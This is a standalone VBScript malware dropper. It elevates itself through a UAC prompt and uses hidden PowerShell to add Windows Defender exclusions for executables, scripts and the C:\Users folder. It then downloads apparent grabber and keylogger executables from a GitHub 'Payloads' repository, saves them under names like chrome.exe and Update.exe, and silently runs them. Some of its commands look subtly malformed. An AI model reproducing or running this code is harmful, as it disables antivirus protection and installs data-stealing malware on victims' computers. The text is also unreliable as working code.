If Script.Arguments.Named.Exists("elevate") = False Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevate", , "runas", 1
    WScript.Quit
End If

Set objShell = CreateObject("WScript.Shell")

' Add exclusion for .exe extension
objShell.Run "powershell -WindowStyle Hidden Add-MpPreference -ExclusionExtension "".exe""", 0, True

' Add exclusion for .ps1 extension
objShell.Run "powershell -WindowStyle Hidden Add-MpPreference -ExclusionExtension "".ps1""", 0, True

' Add exclusion for .lnk extension
objShell.Run "powershell -WindowStyle Hidden Add-MpPreference -ExclusionExtension "".lnk""", 0, True

' Add exclusion for .src extension
objShell.Run "powershell -WindowStyle Hidden Add-MpPreference -ExclusionExtension "".src""", 0, True

' Add exclusion for C:\Users path
objShell.Run "powershell -WindowStyle Hidden Add-MpPreference -ExclusionPath ""C:\Users""", 0, True

' Download and execute chrome.exe
objShell.Run "powershell -WindowStyle Hidden -ep bypass -uri https://github.com/rude90/Payloads/raw/main/Cplus-grabber.exe -o C:\Users\chrome.exe", 0, True
objShell.Run "powershell.exe -w Hidden C:\Users\chrome.exe", 0, True

' Download and execute system32.exe
objShell.Run "powershell -WindowStyle Hidden -ep bypass -uri https://github.com/rude90/Payloads/raw/main/Update.exe -o C:\Users\Update.exe", 0, True
objShell.Run "powershell.exe -w Hidden C:\Users\Update.exe", 0, True

' Download and execute runtime.exe
objShell.Run "powershell -WindowStyle Hidden -ep bypass -uri https://github.com/rude90/Payloads/raw/main/keyboard-new.exe -o C:\Users\runtime.exe", 0, True
objShell.Run "powershell.exe -w Hidden C:\Users\runtime.exe", 0, True

' Download and execute jre.exe
objShell.Run "powershell -ep bypass -uri https://raw.githubusercontent.com/rude90/Payloads/main/jre.exe -o C:\Users\Public\jre.exe", 0, True
objShell.Run "powershell.exe C:\Users\Public\jre.exe", 0, True
